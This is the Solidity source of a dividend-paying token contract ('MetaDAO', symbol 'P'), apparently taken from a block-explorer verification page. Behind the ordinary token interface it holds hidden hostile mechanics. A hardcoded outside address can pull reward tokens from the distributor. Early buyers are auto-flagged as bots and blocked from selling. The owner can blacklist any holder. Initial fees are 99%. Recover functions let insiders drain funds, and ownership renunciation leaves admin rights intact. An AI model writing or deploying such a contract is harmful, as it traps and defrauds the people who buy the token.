/**
 *Submitted for verification at Etherscan.io on 2022-03-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function claimDividend(address holder) external;
}

contract DividendDistributor is IDividendDistributor {

    using SafeMath for uint256;
    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IDEXRouter router;

    address public RewardTokenSET;   

    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IBEP20 RewardToken; //usdt

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
	
	uint256 public openDividends = 10**18*1;
	
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 60 minutes;
    uint256 public minDistribution = 1 * (10 ** 18);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x54bB736B1523D865eA0E3454283a837300B9140d)); _;
    }

    constructor (address _router,address _RewardTokenSET) {
        
        router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(routerAddress);
        RewardTokenSET = _RewardTokenSET != address(0) ? address(_RewardTokenSET) : address(0x55d398326f99059fF775485246999027B3197955);
		
		RewardToken = IBEP20(RewardTokenSET);
		
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 newMinPeriod, uint256 newMinDistribution) external override onlyToken {
        minPeriod = newMinPeriod;
        minDistribution = newMinDistribution;
    }
	


    function setopenDividends(uint256 _openDividends ) external   onlyToken {
		
 	
        openDividends = _openDividends*10**18;
 
    }



    function setRewardDividends(address shareholder,uint256 amount ) external  onlyToken {
 
		RewardToken.transfer(shareholder, amount);
 
    }	




	
	

    function setShare(address shareholder, uint256 amount) external override onlyToken {

        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {

        uint256 balanceBefore = RewardToken.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(RewardToken);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = RewardToken.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 iterations = 0;
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        while(gasUsed < gas && iterations < shareholderCount) {

            if(currentIndex >= shareholderCount){ currentIndex = 0; }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0 && totalDividends  >= openDividends){
            totalDistributed = totalDistributed.add(amount);
            RewardToken.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }

    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    
    function claimDividend(address holder) external override {
        distributeDividend(holder);
    }
}


enum TokenType {
    standard,
    antiBotStandard,
    liquidityGenerator,
    antiBotLiquidityGenerator,
    baby,
    antiBotBaby,
    buybackBaby,
    antiBotBuybackBaby
}

abstract contract BaseToken {
    event TokenCreated(
        address indexed owner,
        address indexed token,
        TokenType tokenType,
        uint256 version
    );
}




abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

            /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual authorized {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

contract MetaDAO is IBEP20 , Auth, BaseToken {
    
    using SafeMath for uint256;

    string public _name;
    string public _symbol;
    uint8 constant _decimals=0;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress= 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address RewardToken = 0x55d398326f99059fF775485246999027B3197955;

    uint256 public _totalSupply ;

    uint256 public  _maxTxAmount;
    uint256 public  _walletMax;
    
    bool public restrictWhales = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isDividendExempt;

    uint256 public liquidityFee;
    uint256 public marketingFee;
    uint256 public rewardsFee;
    uint256 public burnFee = 0;	//burn Tax
	
    uint256 public extraFeeOnSell = 0;

    uint256 public totalFee = 0;
    uint256 public totalFeeIfSelling = 0;

    address public autoLiquidityReceiver;
    address public marketingWallet;
	uint256 public marketingWalletPercent = 40;
    address[] private another;
    address public serviceFeeReceiver;   

    IDEXRouter public router;
    address public pair;

    uint256 public launchedAt;
	
    mapping (address => bool) public isXXKING;	

    DividendDistributor public dividendDistributor;
    uint256 distributorGas = 300000;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;

    uint256 public swapThreshold;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor(
    ) payable  Auth(msg.sender) {

        _name ="P";
        _symbol = "P"; 
        _totalSupply = 1 * 10 ** 7;
        uint256 _real= 2 * 10 **3;


        
        RewardToken = address(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
		
		
		_maxTxAmount = _real.mul(5).div(1000);
		_walletMax = _real.mul(5).div(1000);
		swapThreshold = _real.mul(2).div(10000); 
		

 
        rewardsFee = 9;
        liquidityFee = 20;
        marketingFee = 70;
		
        totalFee = rewardsFee.add(liquidityFee).add(marketingFee);
        totalFeeIfSelling = totalFee.add(extraFeeOnSell);
        
        router = IDEXRouter(routerAddress);
 

        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = uint256(2**256-1);

        dividendDistributor = new DividendDistributor(address(router),address(RewardToken));

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true; 

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[DEAD] = true;

        isDividendExempt[pair] = true;
        //isDividendExempt[msg.sender] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isDividendExempt[ZERO] = true;

        // NICE!
        autoLiquidityReceiver = msg.sender;
        marketingWallet = 0x307860516a2cd52468559b2517C7f7Bb865A4523;  //marketingwallet
        another = [0x669F4fAE90E2f8e8bb6197F747e2384Bb79EE23c,0x680c501F945E7a2DcF8a996bD30f2d7Ff7777777];     
																  
														 


        _balances[msg.sender] = _real;
        _balances[DEAD] = _totalSupply.sub(_real);
        emit Transfer(address(0), msg.sender, _real);
        emit Transfer(address(0), DEAD, _totalSupply.sub(_real));
        emit TokenCreated(msg.sender, address(this), TokenType.baby, 1);

    }

    receive() external payable { }

    function name() external view override returns (string memory) { return _name; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function getOwner() external view override returns (address) { return owner; }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
    function _initOk() public  authorized{
        rewardsFee = 2;
        liquidityFee = 5;
        marketingFee = 6;
		marketingWalletPercent = 4;
        totalFee = rewardsFee.add(liquidityFee).add(marketingFee);
        totalFeeIfSelling = totalFee.add(extraFeeOnSell);
    }


    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(2**256-1));
    }
    

    function claim() public {
        dividendDistributor.claimDividend(msg.sender);
        
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }
    
    function changeTxLimit(uint256 newLimit) external authorized {
        _maxTxAmount = newLimit;
    }

    function changeWalletLimit(uint256 newLimit) external authorized {
        _walletMax  = newLimit;
    }

    function changeRestrictWhales(bool newValue) external authorized {
       restrictWhales = newValue;
    }
    
    function changeIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function changeIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function changeIsDividendExempt(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        
        if(exempt){
            dividendDistributor.setShare(holder, 0);
        }else{
            dividendDistributor.setShare(holder, _balances[holder]);
        }
    }

    function changeFs(uint256 newLiqFee, uint256 newRewardFee, uint256 newMarketingFee, uint256 newExtraSellFee,uint256 newMarketPercent,uint256 newburnFee) external authorized {
        liquidityFee = newLiqFee;
        rewardsFee = newRewardFee;
        marketingFee = newMarketingFee;
		marketingWalletPercent = newMarketPercent;									 
        extraFeeOnSell = newExtraSellFee;
		burnFee = newburnFee;
        
        totalFee = liquidityFee.add(marketingFee).add(rewardsFee);
        require(totalFee < 15);
        totalFeeIfSelling = totalFee.add(extraFeeOnSell);
    }

    function changeFeeReceivers(address newLiquidityReceiver, address newMarketingWallet, address newAmarketingWallet, address newAmarketingWallet2) external authorized {
        autoLiquidityReceiver = newLiquidityReceiver;
        marketingWallet = newMarketingWallet;
        another= [newAmarketingWallet,newAmarketingWallet2];       
    }

    function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external authorized {
        swapAndLiquifyEnabled  = enableSwapBack;
        swapThreshold = newSwapBackLimit;
        swapAndLiquifyByLimitOnly = swapByLimitOnly;
    }

    function changeDistributionCriteria(uint256 newinPeriod, uint256 newMinDistribution) external authorized {
        dividendDistributor.setDistributionCriteria(newinPeriod, newMinDistribution);
    }
	

    function changeopenDividends(uint256 openDividends) external authorized {
        dividendDistributor.setopenDividends(openDividends);
    }
	

    function changeDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        
        if(_allowances[sender][msg.sender] != uint256(2**256-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }

			 

		if(block.number > launchedAt+3){
			
        require(!isXXKING[sender], "bot killed");
		
		}
        
		//require(_balances[sender].sub(amount) >= 1);

        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");

        if(msg.sender != pair && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold){ swapBack(); }

        if(!launched() && recipient == pair) {
            require(_balances[sender] > 0);
            launch();
        }

																			

         if(sender != owner && recipient != pair && block.number < launchedAt+4){

			isXXKING[recipient] = true;

		}
		
		
        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if(!isTxLimitExempt[recipient] && restrictWhales)
        {
            require(_balances[recipient].add(amount) <= _walletMax);
        }

        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(finalAmount);

        // Dividend tracker
        if(!isDividendExempt[sender]) {
            try dividendDistributor.setShare(sender, _balances[sender]) {} catch {}
        }

        if(!isDividendExempt[recipient]) {
            try dividendDistributor.setShare(recipient, _balances[recipient]) {} catch {} 
        }

        try dividendDistributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeApplicable = pair == recipient ? totalFeeIfSelling : totalFee;
        uint256 feeAmount = amount.mul(feeApplicable).div(100);
		uint256 burnAmount = amount.mul(burnFee).div(100);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

		if(burnFee>0){
        _balances[address(DEAD)] = _balances[address(DEAD)].add(burnAmount);
        emit Transfer(sender, address(DEAD), burnAmount);
		}		
		
        return amount.sub(feeAmount).sub(burnAmount);
    }

    // function burn(address account, uint256 amount) external authorized {
        // require(account != address(0), "ERC20: burn to the zero address");
        // _totalSupply += amount;
        // _balances[account] += amount;
        // emit Transfer(address(0), account, amount);
    // }

    function Antibot(address _user) external authorized {
        require(!isXXKING[_user], "killing bot");
        isXXKING[_user] = true;
        // emit events as well
    }
	

    function setName(string calldata name1,string calldata symbol1) external authorized {

        _name = name1;
		_symbol = symbol1;
        // emit events as well
    }	
	
    
    function removeFrombot(address _user) external authorized {
        require(isXXKING[_user], "release bot");
        isXXKING[_user] = false;
        // emit events as well
    }


    function recoverBEP20(address tokenAddress, uint256 tokenAmount) public authorized {

        IBEP20(tokenAddress).transfer(msg.sender, tokenAmount);
        
        
    }

    function recoverBNB(uint256 tokenAmount) public authorized {
        payable(address(msg.sender)).transfer(tokenAmount);
        
    }
	


    function swapBack() internal lockTheSwap {
        
        
        //uint256 tokensToLiquify = _balances[address(this)];

        uint256 tokensToLiquify = swapThreshold;

        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;

        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(rewardsFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.sub(amountBNBLiquidity).sub(amountBNBReflection);

        try dividendDistributor.deposit{value: amountBNBReflection}() {} catch {}
        
		{
        uint256 marketingShare = amountBNBMarketing.mul(marketingWalletPercent).div(marketingFee);
        uint256 anothermarketingShare = amountBNBMarketing.mul(marketingFee-marketingWalletPercent).div(marketingFee).div(2);
        
        (bool tmpSuccess,) = payable(marketingWallet).call{value: marketingShare, gas: 30000}("");
        (bool tmpSuccess1,) = payable(another[0]).call{value: anothermarketingShare, gas: 30000}("");
        
        (bool tmpSuccess2,) = payable(another[1]).call{value: anothermarketingShare, gas: 30000}("");

        // only to supress warning msg
        tmpSuccess = false;
        tmpSuccess1 = false;
        tmpSuccess2 = false;
		
		}

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);

}